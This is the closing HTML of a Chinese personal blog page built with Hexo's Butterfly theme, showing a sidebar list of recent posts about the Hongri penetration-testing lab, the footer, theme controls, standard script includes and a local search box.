href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场四"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B/" title="红日靶场四">红日靶场四</a><time datetime="2024-01-23T09:25:42.516Z" title="发表于 2024-01-23 17:25:42">2024-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二"><img src="https://api.bimg.cc/random" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场二"></a><div class="content"><a class="title" href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二">红日靶场二</a><time datetime="2024-01-23T09:22:35.758Z" title="发表于 2024-01-23 17:22:35">2024-01-23</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2024 By Bamboo22</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
